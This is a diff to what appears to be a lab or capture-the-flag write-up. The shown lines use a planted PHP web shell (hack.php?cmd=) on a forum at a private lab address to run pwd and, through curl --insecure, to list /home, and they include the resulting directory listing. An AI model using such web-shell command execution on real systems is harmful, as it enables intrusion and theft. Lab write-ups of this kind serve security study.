@@ -45,7 +45,7 @@ templates_c - dir which always need write permission, used for compiled template
 After that we can run something like this * https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd * and it will show pwd output * /var/www/forum/templates_c *
 
 After a little research, we can see LOOKATME dir in home dir with other users (I used curl because more convenient output):
-* curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' *
+* curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' * (--insecure because of https not safe)
 drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
 drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
 drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
